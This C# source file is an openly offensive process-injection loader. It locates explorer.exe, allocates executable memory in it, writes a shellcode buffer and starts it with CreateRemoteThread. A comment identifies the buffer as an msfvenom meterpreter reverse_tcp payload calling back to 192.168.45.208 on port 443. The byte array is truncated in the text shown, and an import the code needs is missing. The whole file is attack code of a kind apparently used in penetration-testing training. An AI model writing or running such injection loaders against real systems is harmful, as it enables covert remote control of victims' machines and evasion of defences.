using System;
using System.Runtime.InteropServices;


namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        static void Main(string[] args)
        {
	    // Find PID of explorer.exe
	    Process[] processes = Process.GetProcessesByName("explorer");
            int explorerPid = processes[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerPid);
	    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

	    // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.208 LPORT=443 -f csharp
            byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,...
            
	    IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
